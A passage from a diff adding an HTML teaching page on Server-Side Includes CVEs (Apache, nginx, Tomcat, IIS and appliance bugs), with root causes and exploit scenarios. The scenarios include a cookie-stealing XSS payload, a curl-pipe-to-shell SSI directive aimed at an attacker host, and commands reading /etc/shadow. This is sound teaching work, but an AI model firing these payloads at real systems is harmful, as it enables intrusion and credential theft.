@@ -1,0 +1,1163 @@
+<title>Directives &amp; Entities</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:ital,wght@0,400;0,600;1,400&display=swap">
+<style>
+:root{
+  --paper:#F1F4F7; --surface:#FFFFFF; --surface-2:#E8EDF2;
+  --ink:#0F1620; --ink-2:#3B4855; --ink-3:#6A7885;
+  --rule:#D4DBE3; --rule-strong:#B6C2CE;
+  --accent:#0E4A7B; --accent-soft:#E2ECF5;
+  --note:#8A5A06; --note-soft:#F7EFDC;
+  --bad:#9B3220; --bad-soft:#F8E7E2;
+  --good:#2B6349; --good-soft:#E0EFE7;
+  --code-bg:#F4F7F9;
+  --shadow:0 1px 2px rgba(15,22,32,.05), 0 8px 24px -18px rgba(15,22,32,.35);
+  --sans:"IBM Plex Sans",ui-sans-serif,system-ui,"Segoe UI",Helvetica,Arial,sans-serif;
+  --serif:"IBM Plex Serif",ui-serif,Georgia,"Times New Roman",serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --paper:#0D1218; --surface:#141B23; --surface-2:#1C252E;
+  --ink:#E7ECF1; --ink-2:#B3BFCB; --ink-3:#8492A0;
+  --rule:#27313B; --rule-strong:#3A4753;
+  --accent:#84B6E2; --accent-soft:#15283A;
+  --note:#E1AD57; --note-soft:#2A2114;
+  --bad:#E88C74; --bad-soft:#2E1C17;
+  --good:#7FC6A0; --good-soft:#15271E;
+  --code-bg:#101821;
+  --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 30px -20px rgba(0,0,0,.9);
+}}
+:root[data-theme="dark"]{
+  --paper:#0D1218; --surface:#141B23; --surface-2:#1C252E;
+  --ink:#E7ECF1; --ink-2:#B3BFCB; --ink-3:#8492A0;
+  --rule:#27313B; --rule-strong:#3A4753;
+  --accent:#84B6E2; --accent-soft:#15283A;
+  --note:#E1AD57; --note-soft:#2A2114;
+  --bad:#E88C74; --bad-soft:#2E1C17;
+  --good:#7FC6A0; --good-soft:#15271E;
+  --code-bg:#101821;
+  --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 30px -20px rgba(0,0,0,.9);
+}
+*{box-sizing:border-box}
+body{background:var(--paper); color:var(--ink); font-family:var(--serif);
+     font-size:16.5px; line-height:1.62; -webkit-font-smoothing:antialiased;}
+::selection{background:var(--accent-soft); color:var(--ink)}
+a{color:var(--accent); text-underline-offset:2px; text-decoration-thickness:.06em}
+a:focus-visible,button:focus-visible{outline:2px solid var(--accent); outline-offset:3px; border-radius:2px}
+
+/* ---------- masthead ---------- */
+.mast{border-bottom:1px solid var(--rule); background:var(--surface)}
+.mast-in{max-width:1180px; margin:0 auto; padding:44px 28px 30px;
+         display:flex; flex-direction:column; gap:18px}
+.eyebrow{font-family:var(--mono); font-size:11.5px; font-weight:500; letter-spacing:.14em;
+         text-transform:uppercase; color:var(--ink-3); display:flex; gap:10px; align-items:center; flex-wrap:wrap}
+.eyebrow .tick{color:var(--accent)}
+h1{font-family:var(--sans); font-weight:700; font-size:clamp(2.1rem,5vw,3.15rem);
+   line-height:1.04; letter-spacing:-.024em; margin:0; text-wrap:balance}
+.dek{font-size:1.06rem; color:var(--ink-2); max-width:64ch; margin:0}
+.env{display:flex; flex-wrap:wrap; gap:8px; margin-top:2px}
+.env span{font-family:var(--mono); font-size:11.5px; padding:4px 9px; border-radius:3px;
+          background:var(--surface-2); color:var(--ink-2); border:1px solid var(--rule)}
+
+/* ---------- shell ---------- */
+.shell{max-width:1180px; margin:0 auto; padding:0 28px 96px;
+       display:grid; grid-template-columns:1fr; gap:0}
+@media(min-width:1060px){.shell{grid-template-columns:216px minmax(0,1fr); gap:56px}}
+
+nav.toc{display:none}
+@media(min-width:1060px){
+  nav.toc{display:block; position:sticky; top:0; align-self:start; max-height:100vh;
+          overflow-y:auto; padding:44px 0 40px; font-family:var(--sans); font-size:13.5px}
+  nav.toc ol{list-style:none; margin:0; padding:0; display:flex; flex-direction:column; gap:1px}
+  nav.toc a{display:block; padding:5px 10px 5px 12px; color:var(--ink-2); text-decoration:none;
+            border-left:2px solid var(--rule); border-radius:0 3px 3px 0}
+  nav.toc a:hover{color:var(--ink); background:var(--surface-2); border-left-color:var(--rule-strong)}
+  nav.toc a .n{font-family:var(--mono); font-size:11px; color:var(--ink-3); margin-right:7px}
+  nav.toc .grp{font-family:var(--mono); font-size:10.5px; letter-spacing:.14em; text-transform:uppercase;
+               color:var(--ink-3); padding:18px 0 6px 12px}
+}
+main{padding-top:44px; min-width:0}
+
+/* ---------- typography ---------- */
+section{margin:0 0 12px}
+h2{font-family:var(--sans); font-weight:700; font-size:1.72rem; letter-spacing:-.019em;
+   line-height:1.18; margin:56px 0 6px; text-wrap:balance; scroll-margin-top:20px}
+h2 .n{font-family:var(--mono); font-size:.72em; font-weight:500; color:var(--accent);
+      display:block; margin-bottom:7px; letter-spacing:.02em}
+h3{font-family:var(--sans); font-weight:600; font-size:1.13rem; letter-spacing:-.008em;
+   margin:38px 0 4px; text-wrap:balance; scroll-margin-top:20px}
+h3 .n{font-family:var(--mono); font-weight:500; color:var(--ink-3); margin-right:.5em; font-size:.92em}
+h4{font-family:var(--sans); font-weight:600; font-size:.95rem; margin:26px 0 2px; color:var(--ink-2)}
+p{margin:14px 0; max-width:68ch}
+ul,ol{max-width:68ch; margin:14px 0; padding-left:1.25em}
+li{margin:7px 0}
+li::marker{color:var(--ink-3)}
+strong{font-weight:600}
+em{font-style:italic}
+code{font-family:var(--mono); font-size:.855em; background:var(--surface-2);
+     padding:1.5px 4.5px; border-radius:3px; color:var(--ink); word-break:break-word}
+h2 code,h3 code,h4 code{background:none; padding:0; font-size:.9em}
+.lede{font-size:1.05rem; color:var(--ink-2); max-width:66ch}
+hr{border:0; border-top:1px solid var(--rule); margin:52px 0 0}
+
+/* ---------- code blocks ---------- */
+.blk{margin:18px 0; border:1px solid var(--rule); border-radius:5px; background:var(--code-bg);
+     overflow:hidden; box-shadow:var(--shadow)}
+.blk pre{margin:0; padding:14px 16px; overflow-x:auto}
+.blk code{font-family:var(--mono); font-size:12.8px; line-height:1.62; background:none;
+          padding:0; white-space:pre; color:var(--ink-2)}
+.blk-label{font-family:var(--mono); font-size:10.5px; letter-spacing:.13em; text-transform:uppercase;
+           padding:7px 16px; border-bottom:1px solid var(--rule); color:var(--ink-3);
+           background:var(--surface)}
+.blk.term{border-left:3px solid var(--note)}
+.blk.term .blk-label{color:var(--note)}
+.blk.term code{color:var(--ink)}
+
+/* ---------- callouts ---------- */
+.note{margin:20px 0; padding:14px 18px; border-left:3px solid var(--accent);
+      background:var(--accent-soft); border-radius:0 5px 5px 0; max-width:70ch}
+.note p{margin:6px 0; max-width:none}
+.note p:first-child{margin-top:0} .note p:last-child{margin-bottom:0}
+.note.warn{border-left-color:var(--note); background:var(--note-soft)}
+.note .lbl{font-family:var(--mono); font-size:10.5px; letter-spacing:.13em; text-transform:uppercase;
+           color:var(--accent); display:block; margin-bottom:5px}
+.note.warn .lbl{color:var(--note)}
+
+/* ---------- tables ---------- */
+.tw{overflow-x:auto; margin:20px 0; border:1px solid var(--rule); border-radius:5px;
+    background:var(--surface); box-shadow:var(--shadow)}
+table{border-collapse:collapse; width:100%; font-family:var(--sans); font-size:13.6px;
+      font-variant-numeric:tabular-nums}
+th{text-align:left; font-weight:600; font-size:11px; letter-spacing:.1em; text-transform:uppercase;
+   color:var(--ink-3); padding:11px 14px; border-bottom:1px solid var(--rule-strong); white-space:nowrap}
+td{padding:10px 14px; border-bottom:1px solid var(--rule); color:var(--ink-2); vertical-align:top}
+tr:last-child td{border-bottom:0}
+td code{font-size:12.2px}
+td strong{color:var(--ink)}
+.yes,.no,.na{font-family:var(--mono); font-size:11px; font-weight:500; padding:2px 7px;
+             border-radius:3px; white-space:nowrap; display:inline-block}
+.yes{background:var(--good-soft); color:var(--good)}
+.no{background:var(--bad-soft); color:var(--bad)}
+.na{background:var(--surface-2); color:var(--ink-3)}
+
+/* ---------- CVE picker ---------- */
+.filters{display:flex; flex-wrap:wrap; gap:7px; margin:22px 0 18px; align-items:center}
+.filters .fl{font-family:var(--mono); font-size:10.5px; letter-spacing:.13em; text-transform:uppercase;
+             color:var(--ink-3); margin-right:4px}
+.filters button{font-family:var(--sans); font-size:12.5px; font-weight:500; cursor:pointer;
+                padding:5px 11px; border-radius:999px; border:1px solid var(--rule);
+                background:var(--surface); color:var(--ink-2); transition:background .12s,border-color .12s}
+.filters button:hover{border-color:var(--rule-strong); color:var(--ink)}
+.filters button[aria-pressed="true"]{background:var(--accent); border-color:var(--accent); color:var(--paper)}
+.cves{display:grid; gap:14px; margin:8px 0 6px}
+@media(min-width:760px){.cves{grid-template-columns:repeat(2,minmax(0,1fr))}}
+.cve{border:1px solid var(--rule); border-radius:6px; background:var(--surface); padding:16px 18px;
+     display:flex; flex-direction:column; gap:8px; box-shadow:var(--shadow)}
+.cve[hidden]{display:none}
+.cve .id{font-family:var(--mono); font-size:14px; font-weight:600; color:var(--ink); letter-spacing:-.01em}
+.cve .id a{color:inherit; text-decoration:none; border-bottom:1px solid var(--rule-strong)}
+.cve .id a:hover{color:var(--accent); border-bottom-color:var(--accent)}
+.cve .prod{font-family:var(--sans); font-size:13px; color:var(--ink-2); margin:-4px 0 0}
+.cve .why{font-family:var(--sans); font-size:13.2px; color:var(--ink-2); line-height:1.5; margin:0}
+.cve .meta{display:flex; flex-wrap:wrap; gap:6px; margin-top:2px}
+.tag{font-family:var(--mono); font-size:10.5px; letter-spacing:.05em; padding:3px 8px; border-radius:3px;
+     background:var(--surface-2); color:var(--ink-3); border:1px solid var(--rule)}
+.tag.sev{background:var(--bad-soft); color:var(--bad); border-color:transparent}
+.tag.sev.mid{background:var(--note-soft); color:var(--note)}
+.tag.sev.low{background:var(--surface-2); color:var(--ink-3); border-color:var(--rule)}
+
+/* ---------- sources ---------- */
+.src h3{margin-top:26px}
+.src ul{list-style:none; padding:0; max-width:78ch}
+.src li{margin:7px 0; font-family:var(--sans); font-size:13.5px; color:var(--ink-2);
+        padding-left:15px; text-indent:-15px}
+.src a{word-break:break-word}
+footer{border-top:1px solid var(--rule); margin-top:56px; padding-top:22px;
+       font-family:var(--sans); font-size:13px; color:var(--ink-3); max-width:68ch}
+@media (prefers-reduced-motion:reduce){*{transition:none!important; animation:none!important}}
+</style>
+<header class="mast"><div class="mast-in">
+<div class="eyebrow"><span class="tick">&#9670;</span> Web security research pack
+<span class="tick">&#9670;</span> Cairo University &mdash; Computer Science</div>
+<h1>Directives &amp; Entities</h1>
+<p class="dek">Eight Server-Side Includes CVEs, one per team &mdash; then the SSI directives nobody
+covers, and how XXE reads source code, reaches files without <code>file://</code>, and exfiltrates
+data when nothing comes back.</p>
+<div class="env"><span>verified on PHP 8.4.19</span><span>libxml 2.9.14</span><span>OpenJDK 21.0.10</span>
+<span>lab: research/lab/</span></div>
+</div></header>
+
+<div class="shell">
+<nav class="toc" aria-label="Contents">
+  <div class="grp">Server-Side Includes</div>
+  <ol>
+    <li><a href="#cves"><span class="n">1</span>CVE catalogue</a></li>
+    <li><a href="#directives"><span class="n">2</span>Directives</a></li>
+  </ol>
+  <div class="grp">XXE</div>
+  <ol>
+    <li><a href="#source"><span class="n">3</span>Source code</a></li>
+    <li><a href="#nofile"><span class="n">4</span>Without file://</a></li>
+    <li><a href="#blind"><span class="n">5</span>Blind XXE</a></li>
+  </ol>
+  <div class="grp">Reference</div>
+  <ol>
+    <li><a href="#defences"><span class="n">6</span>Defences</a></li>
+    <li><a href="#lab"><span class="n">7</span>The lab</a></li>
+    <li><a href="#sources"><span class="n">8</span>Sources</a></li>
+  </ol>
+</nav>
+<main>
+
+<p class="lede">Everything marked <strong>verified</strong> was reproduced locally and the raw
+output is quoted next to the claim. Everything else comes from vendor documentation or the CVE
+record and is cited in &sect;8. Written for authorised lab work, CTFs and defensive review &mdash;
+fire these payloads only at systems you own or have written permission to test.</p>
+
+<section id="cves">
+<h2><span class="n">Part 1</span>Eight SSI CVEs, one per team</h2>
+<p>Deliberately spread across four bug classes, so no two teams end up telling the same story.
+Filter by theme to find one nobody has taken.</p>
+
+<div class="filters" role="group" aria-label="Filter CVEs by theme">
+  <span class="fl">Theme</span>
+  <button type="button" data-f="all" aria-pressed="true">All eight</button>
+  <button type="button" data-f="core" aria-pressed="false">Server-core logic</button>
+  <button type="button" data-f="mem" aria-pressed="false">Memory safety</button>
+  <button type="button" data-f="enc" aria-pressed="false">Output encoding</button>
+  <button type="button" data-f="app" aria-pressed="false">Application CWE-97</button>
+</div>
+
+<div class="cves">
+  <article class="cve" data-t="core">
+    <div class="id"><a href="#cve-58098">CVE-2025-58098</a></div>
+    <p class="prod">Apache httpd &le; 2.4.65 with <code>mod_cgid</code></p>
+    <p class="why">The query string is appended to whatever <code>#exec cmd</code> runs. Not shell
+    injection &mdash; metacharacters are escaped &mdash; but attacker-controlled extra
+    <em>arguments</em>. Analysed here from the upstream patch.</p>
+    <div class="meta"><span class="tag sev mid">ASF: moderate</span><span class="tag">CWE-201</span><span class="tag">argument injection</span></div>
+  </article>
+  <article class="cve" data-t="mem">
+    <div class="id"><a href="#cve-56434">CVE-2026-56434</a></div>
+    <p class="prod">nginx <code>ngx_http_ssi_module</code> 0.8.11&ndash;1.31.2</p>
+    <p class="why">Use-after-free when SSI meets <code>proxy_pass</code> with
+    <code>proxy_buffering off</code>. The attacker is whoever controls the upstream response, not
+    the client. Sixteen years in the tree.</p>
+    <div class="meta"><span class="tag sev">8.3 CVSS 4.0</span><span class="tag">CWE-416</span><span class="tag">no workaround</span></div>
+  </article>
+  <article class="cve" data-t="enc">
+    <div class="id"><a href="#cve-0221">CVE-2019-0221</a></div>
+    <p class="prod">Apache Tomcat SSI <code>printenv</code></p>
+    <p class="why">Tomcat escapes <code>#echo</code> and forgets <code>#printenv</code>, so request
+    data lands in the page raw. The vendor argued it away as low &mdash; a defensible position worth
+    arguing both sides of.</p>
+    <div class="meta"><span class="tag sev mid">6.1</span><span class="tag">CWE-79</span><span class="tag">reflected XSS</span></div>
+  </article>
+  <article class="cve" data-t="core">
+    <div class="id"><a href="#cve-1195">CVE-2009-1195</a></div>
+    <p class="prod">Apache httpd &le; 2.2.11 <code>AllowOverride</code></p>
+    <p class="why">Permitting the safe <code>IncludesNOEXEC</code> silently permitted full
+    <code>Includes</code> too. A policy-enforcement bug: the parser behaved, the access-control
+    layer lied about what it had allowed.</p>
+    <div class="meta"><span class="tag sev low">local privesc</span><span class="tag">control bypass</span><span class="tag">shared hosting</span></div>
+  </article>
+  <article class="cve" data-t="mem">
+    <div class="id"><a href="#cve-0940">CVE-2004-0940</a></div>
+    <p class="prod">Apache 1.3.x&ndash;1.3.32 <code>mod_include</code></p>
+    <p class="why">Length accounting for escaped characters in <code>get_tag()</code> is wrong, so a
+    crafted SSI attribute overflows a stack buffer. Public exploits exist. Pairs with
+    CVE-2026-56434 as the same class, 22 years apart.</p>
+    <div class="meta"><span class="tag sev">code exec</span><span class="tag">stack overflow</span><span class="tag">httpd user</span></div>
+  </article>
+  <article class="cve" data-t="mem">
+    <div class="id"><a href="#cve-0506">CVE-2001-0506</a></div>
+    <p class="prod">IIS 4.0 / 5.0 <code>ssinc.dll</code></p>
+    <p class="why">An over-long <code>#include</code> filename overruns a buffer in the SSI
+    interpreter, which ran as Local System. The CVE OWASP still cites on its own SSI page.</p>
+    <div class="meta"><span class="tag sev">local &rarr; SYSTEM</span><span class="tag">MS01-044</span><span class="tag">buffer overrun</span></div>
+  </article>
+  <article class="cve" data-t="app">
+    <div class="id"><a href="#cve-3788">CVE-2024-3788</a></div>
+    <p class="prod">WBSAirback 21.02.04 (backup appliance)</p>
+    <p class="why">Stored SSI injection through the licence field at <code>/admin/CDPUsers</code>.
+    The purest textbook CWE-97 in the set, and its scope-changed vector is the interesting part.</p>
+    <div class="meta"><span class="tag sev mid">6.6</span><span class="tag">CWE-97</span><span class="tag">stored, PR:H</span></div>
+  </article>
+  <article class="cve" data-t="app">
+    <div class="id"><a href="#cve-1728">CVE-2023-1728</a></div>
+    <p class="prod">Fernus Informatics LMS &lt; 23.04.03</p>
+    <p class="why">Upload filter blocks <code>.php</code> and <code>.jsp</code> and forgets
+    <code>.shtml</code>. Unauthenticated upload &rarr; SSI injection &rarr; RCE on a system holding
+    student records.</p>
+    <div class="meta"><span class="tag sev">9.8</span><span class="tag">CWE-434</span><span class="tag">pre-auth RCE</span></div>
+  </article>
+</div>
+<h3 id="cve-58098"><span class="n">1.1</span>CVE-2025-58098 &mdash; httpd hands the query string to <code>#exec cmd</code></h3>
+<p><strong>Affected:</strong> Apache HTTP Server &lt; 2.4.66, when SSI is enabled <em>and</em>
+<code>mod_cgid</code> is loaded (<code>mod_cgi</code> is not affected). Fixed in 2.4.66, released
+4&nbsp;December&nbsp;2025. Reported by Anthony Parfenov (United Rentals). The ASF classifies it
+CWE-201, <em>Insertion of Sensitive Information Into Sent Data</em>, severity <strong>moderate</strong>.</p>
+
+<p><strong>Root cause, read from the patch.</strong> Diffing the 2.4.65 and 2.4.66 tags shows the
+fix lives entirely in <code>modules/generators/mod_cgid.c</code>; <code>mod_include.c</code> is
+byte-for-byte identical between the two releases.</p><div class="blk code"><div class="blk-label">httpd 2.4.65 → 2.4.66, mod_cgid.c</div><pre><code>-  argv = (const char * const *)create_argv(r-&gt;pool, NULL, NULL, NULL, argv0, r-&gt;args);
++  /* Do not pass args in case of SSI requests */
++  argv = (const char * const *)create_argv(r-&gt;pool, NULL, NULL, NULL,
++                                           argv0,
++                                           cgid_req.req_type == SSI_REQ ? NULL : r-&gt;args);</code></pre></div><p><code>create_argv()</code> implements the CGI &ldquo;command line arguments&rdquo; rule of
+RFC&nbsp;3875&nbsp;&sect;4.4: if the query string contains <strong>no <code>=</code></strong>, it is
+split on <code>+</code>, each word is URL-decoded and then passed through
+<code>ap_escape_shell_cmd()</code>. For an SSI request <code>mod_cgid</code> sets
+<code>cmd_type&nbsp;=&nbsp;APR_SHELLCMD</code>, and APR&rsquo;s shell path concatenates every argv
+element into a single string handed to <code>/bin/sh -c</code>. Net effect: attacker-supplied words
+are appended to the command line of whatever the page executes.</p>
+
+<div class="note"><span class="lbl">What the attacker actually controls</span>
+<p><code>ap_escape_shell_cmd()</code> backslash-escapes
+<code>&amp; ; ` ' " | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \ \n \r %</code>, so this is
+<strong>not</strong> free-form shell metacharacter injection. What you get is <em>argument</em>
+injection: extra whitespace-separated tokens appended to the command. Several third-party trackers
+label this &ldquo;RCE&rdquo;; that is only reachable indirectly, through a target binary whose flags
+are dangerous.</p></div>
+
+<p><strong>Exploit scenario.</strong> A status page contains:</p><div class="blk code"><div class="blk-label">status.shtml</div><pre><code>&lt;!--#exec cmd="/usr/bin/tail -n 20 /var/log/app/current.log" --&gt;</code></pre></div><p>The attacker requests <code>/status.shtml?/etc/shadow</code> &mdash; note: no <code>=</code>
+anywhere in the query string, or the code path is skipped. The child runs:</p><div class="blk code"><div class="blk-label">resulting command</div><pre><code>/bin/sh -c "/usr/bin/tail -n 20 /var/log/app/current.log /etc/shadow"</code></pre></div><p><code>tail</code> happily prints the second file. Escalating from file read to execution is
+the classic argument-injection game &mdash; pick a target binary with an &ldquo;execute this&rdquo;
+flag (<code>tar --checkpoint-action=exec=</code>, <code>find -exec</code>,
+<code>awk 'BEGIN{system(...)}'</code>, <code>curl -o</code>, <code>zip --unzip-command</code>).
+Secondary impact, matching the ASF&rsquo;s CWE-201 rating: the raw query string lands in the process
+command line, visible in <code>ps</code>, in audit logs, and to any other local user.</p>
+
+<p><strong>Discussion angles.</strong> Why does <code>mod_cgi</code> escape this and
+<code>mod_cgid</code> not? Why is a forty-year-old CGI convention still live in 2025? And why is the
+ASF&rsquo;s &ldquo;moderate / information disclosure&rdquo; rating arguably right where the
+press&rsquo;s &ldquo;critical RCE&rdquo; is arguably wrong?</p>
+
+<h3 id="cve-56434"><span class="n">1.2</span>CVE-2026-56434 &mdash; use-after-free in nginx&rsquo;s SSI filter</h3>
+<p><strong>Affected:</strong> nginx OSS 0.8.11&ndash;1.31.2 (fixed in 1.31.3 mainline / 1.30.4
+stable); NGINX Plus R33+ up to R36&nbsp;P7 / 37.0.3.1. CWE-416. CVSS&nbsp;4.0 <strong>8.3</strong>,
+CVSS&nbsp;3.1 6.5. There is no workaround &mdash; patching is the only fix.</p>
+
+<p><strong>Trigger condition:</strong> <code>ssi on;</code> <em>and</em> <code>proxy_pass</code>
+<em>and</em> <code>proxy_buffering off;</code> in the same location. With buffering off, nginx
+streams the upstream response through the SSI filter chunk by chunk; a crafted upstream response
+drives the filter into freeing a buffer that is still referenced.</p>
+
+<p><strong>Exploit scenario.</strong> The attacker is not the client &mdash; it is whoever controls
+the <em>upstream</em> response. Realistically: a MITM on a plaintext
+<code>proxy_pass http://backend</code> hop (a flat datacentre network, a compromised service-mesh
+sidecar, a poisoned DNS entry for the upstream name), or an upstream application that reflects
+attacker-controlled bytes into a response nginx will SSI-parse. The result is limited memory
+corruption in the worker: enough to modify memory contents or force worker restarts. Each worker
+holds many clients&rsquo; connections, so repeated restarts are an availability attack; the
+memory-modification primitive is the interesting half. F5 notes explicitly that this is data-plane
+only, with no control-plane exposure.</p>
+
+<p><strong>Discussion angles.</strong> Why does turning buffering <em>off</em> create a lifetime bug?
+<code>proxy_buffering off</code> is standard advice for streaming and SSE endpoints, so the
+&ldquo;insecure&rdquo; configuration is one people are told to use. And the vulnerable range starts
+at 0.8.11 &mdash; this survived roughly sixteen years.</p>
+
+<h3 id="cve-0221"><span class="n">1.3</span>CVE-2019-0221 &mdash; XSS in Tomcat&rsquo;s SSI <code>printenv</code></h3>
+<p><strong>Affected:</strong> Tomcat 9.0.0.M1&ndash;9.0.0.17, 8.5.0&ndash;8.5.39, 7.0.0&ndash;7.0.93.
+Fixed in 7.0.94 / 8.5.40 / 9.0.19. CVSS 6.1.</p>
+
+<p><strong>Root cause.</strong> Tomcat HTML-escapes values for <code>#echo</code> &mdash; whose
+<code>encoding</code> parameter defaults to <code>entity</code> &mdash; but <code>#printenv</code>
+dumps every variable with no escaping at all. Request-derived variables such as
+<code>QUERY_STRING</code>, <code>HTTP_USER_AGENT</code> and <code>DOCUMENT_URI</code> therefore reach
+the response body raw.</p>
+
+<p><strong>Exploit scenario.</strong> A <code>debug.shtml</code> left in a staging build contains
+<code>&lt;!--#printenv --&gt;</code>. The attacker sends
+<code>GET /debug.shtml?&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;</code> and hands
+the link to a logged-in administrator. The script executes on the application&rsquo;s origin:
+session theft, CSRF-token exfiltration, admin actions.</p>
+
+<p><strong>Discussion angles.</strong> The vendor rated this low on three grounds &mdash; SSI is off
+by default, almost nobody uses it, and <code>printenv</code> is a debugging directive with no place
+in production. That is a genuinely defensible risk acceptance and a good thing to argue both sides
+of. It also shows cleanly why a per-directive encoding default is worthless if a sibling directive
+skips it.</p>
+
+<h3 id="cve-1195"><span class="n">1.4</span>CVE-2009-1195 &mdash; <code>Options=IncludesNOEXEC</code> restricts nothing</h3>
+<p><strong>Affected:</strong> Apache httpd &le; 2.2.11.</p>
+
+<p><strong>Root cause.</strong> <code>IncludesNOEXEC</code> is the SSI safety valve: it enables SSI
+but disables <code>#exec</code> and the execution of CGI via <code>#include virtual</code>. An
+administrator writing <code>AllowOverride Options=IncludesNOEXEC</code> intends &ldquo;tenants may
+switch SSI on, but only the safe subset&rdquo;. A logic error in the
+<code>Options</code>/<code>AllowOverride</code> merge meant permitting <code>IncludesNOEXEC</code>
+also permitted plain <code>Includes</code> &mdash; the full, <code>#exec</code>-enabled variant.</p>
+
+<p><strong>Exploit scenario.</strong> Classic shared-hosting escalation. A low-privileged tenant who
+can write into their own docroot drops a <code>.htaccess</code>:</p><div class="blk code"><div class="blk-label">.htaccess</div><pre><code>Options +Includes
+AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml</code></pre></div><p>&hellip; then a <code>pwn.shtml</code> containing
+<code>&lt;!--#exec cmd="/bin/cat /home/othertenant/config.php" --&gt;</code>. Requesting the page runs
+the command as the httpd user, which can read every vhost on the box. The tenant has escaped their
+own account into the shared web-server identity.</p>
+
+<p><strong>Discussion angles.</strong> This is a <em>policy-enforcement</em> bug, not a memory or
+parsing bug &mdash; the parser worked exactly as designed and the access-control layer lied about
+what it had allowed. Good material on why defence in depth means not letting a single boolean merge
+decide whether command execution is reachable.</p>
+
+<h3 id="cve-0940"><span class="n">1.5</span>CVE-2004-0940 &mdash; overflow in <code>mod_include</code>&rsquo;s <code>get_tag()</code></h3>
+<p><strong>Affected:</strong> Apache 1.3.x through 1.3.32; fixed in 1.3.33.</p>
+
+<p><strong>Root cause.</strong> <code>get_tag()</code> parses the <code>name=value</code> pairs inside
+an SSI element. Its length accounting for <em>escaped</em> characters inside a tag string is wrong,
+so a sufficiently long, carefully escaped attribute overflows a fixed-size stack buffer.</p>
+
+<p><strong>Exploit scenario.</strong> The attacker must be able to place an SSI-parsed document on
+the server &mdash; the shared-hosting model again, or any application with an upload directory
+inside an <code>Options +Includes</code> tree that serves <code>.shtml</code>. Uploading a malformed
+SSI document and fetching it corrupts the stack of the httpd child and yields code execution as the
+<code>apache</code> user. Public exploits exist (Exploit-DB 587, 24694).</p>
+
+<p><strong>Discussion angles.</strong> A memory-safety bug in a <em>text templating</em> feature
+&mdash; the SSI parser is C chewing on attacker-influenced strings, exactly the shape of bug the
+industry spent the next twenty years designing out. Pairs neatly with CVE-2026-56434 as the same
+class, twenty-two years apart, in a different server.</p>
+
+<h3 id="cve-0506"><span class="n">1.6</span>CVE-2001-0506 &mdash; IIS <code>ssinc.dll</code> SSI buffer overrun</h3>
+<p><strong>Affected:</strong> IIS 4.0 and 5.0. Microsoft bulletin MS01-044. This is the CVE OWASP
+itself cites on its SSI Injection page.</p>
+
+<p><strong>Root cause.</strong> IIS maps <code>.stm</code>, <code>.shtm</code> and <code>.shtml</code>
+to <code>ssinc.dll</code>. Resolving an SSI <code>#include</code> appends the directory name to the
+supplied filename; an over-long filename overflows the destination buffer during that
+concatenation.</p>
+
+<p><strong>Exploit scenario, as OWASP documents it.</strong> Create a file containing an
+<code>#include</code> whose filename is more than 2049 <code>U</code> characters, then get IIS to
+parse it. Where the attacker cannot upload, OWASP chains it with a path-traversal or remote-include
+primitive in the application itself:</p><div class="blk code"><div class="blk-label">OWASP proof of concept</div><pre><code>&lt;!--#include file="UUUUUUUU...UU"--&gt;        &lt;!-- &gt; 2049 characters --&gt;
+
+http://vulnerable.example/index.asp?page=http://attacker.example/ssi_over.shtml</code></pre></div><p>A blank response indicates the overflow fired. Because <code>ssinc.dll</code> ran in the Local
+System context, successful exploitation jumps straight from &ldquo;can write web content&rdquo; to
+full machine compromise.</p>
+
+<p><strong>Discussion angles.</strong> The historical value is the <em>privilege model</em>: a
+templating DLL running as SYSTEM. Compare with modern IIS application-pool isolation and with
+Apache&rsquo;s <code>IncludesNOEXEC</code> &mdash; two different answers to &ldquo;how much authority
+should a template engine hold?&rdquo;</p>
+
+<h3 id="cve-3788"><span class="n">1.7</span>CVE-2024-3788 &mdash; SSI injection in WBSAirback</h3>
+<p><strong>Affected:</strong> WBSAirback 21.02.04, a backup appliance. CVSS&nbsp;3.1 <strong>6.6</strong>
+(<code>AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L</code>). The CNA titled it &ldquo;Improper Neutralization
+of Server-Side Includes (SSI) vulnerability in WBSAirback&rdquo;.</p>
+
+<p><strong>Root cause.</strong> The <code>License</code> field reachable through
+<code>/admin/CDPUsers</code> is stored and later rendered into a page the server SSI-parses, with no
+neutralisation of the <code>&lt;!--#</code> sequence.</p>
+
+<p><strong>Exploit scenario.</strong> A high-privilege but non-root operator &mdash; note
+<code>PR:H</code>, this is insider or post-compromise escalation rather than a pre-auth bug &mdash;
+pastes <code>&lt;!--#exec cmd="id; cat /etc/shadow" --&gt;</code> into the licence field. The next
+time any user loads the affected admin page, the command runs as the appliance&rsquo;s web-server
+user. The <code>S:C</code> in the vector is the interesting part: the injected directive executes
+outside the security scope of the component that stored it.</p>
+
+<p><strong>Discussion angles.</strong> The purest textbook CWE-97 in the list: user input, stored,
+SSI-parsed. Ideal for demonstrating the OWASP detection method &mdash; probe with
+<code>&lt; ! # = / . " - &gt;</code> &mdash; and for arguing whether <code>PR:H</code> bugs in
+appliances deserve their low-ish scores when the appliance is a backup server holding
+everyone&rsquo;s data.</p>
+
+<h3 id="cve-1728"><span class="n">1.8</span>CVE-2023-1728 &mdash; Fernus LMS: upload chained to SSI injection</h3>
+<p><strong>Affected:</strong> Fernus Informatics LMS before 23.04.03. CVSS&nbsp;3.1 <strong>9.8</strong>
+(<code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>). CWE-434, with the CVE text stating explicitly
+that the upload &ldquo;allows OS Command Injection, Server Side Include (SSI) Injection&rdquo;.</p>
+
+<p><strong>Root cause.</strong> Unrestricted upload of files with a dangerous type. The upload filter
+does not reject SSI-parsed extensions, and the upload directory is served by a handler that parses
+them.</p>
+
+<p><strong>Exploit scenario.</strong> An unauthenticated attacker (<code>PR:N</code>) uploads
+<code>avatar.shtml</code> containing
+<code>&lt;!--#exec cmd="curl http://attacker/s.sh | sh" --&gt;</code>, then requests it back from the
+uploads path. The server executes the directive on the request that renders the file: full pre-auth
